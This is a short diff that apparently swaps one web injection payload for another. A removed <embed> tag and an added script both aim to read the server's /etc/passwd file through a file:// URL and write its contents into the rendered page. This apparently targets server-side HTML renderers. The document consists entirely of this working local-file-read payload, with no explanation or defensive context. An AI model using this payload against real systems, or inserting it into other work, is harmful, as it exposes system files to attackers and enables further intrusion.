@@ -1,1 +1,8 @@
-<embed src="file:///etc/passwd" width="100%" height="800px">
+<script>
+    var xhr = new XMLHttpRequest();
+    // Request the local file from the server's own perspective
+    xhr.open('GET', 'file:///etc/passwd', false); 
+    xhr.send();
+    // Inject the raw contents of /etc/passwd directly into the document
+    document.write('<pre>' + xhr.responseText + '</pre>');
+</script>
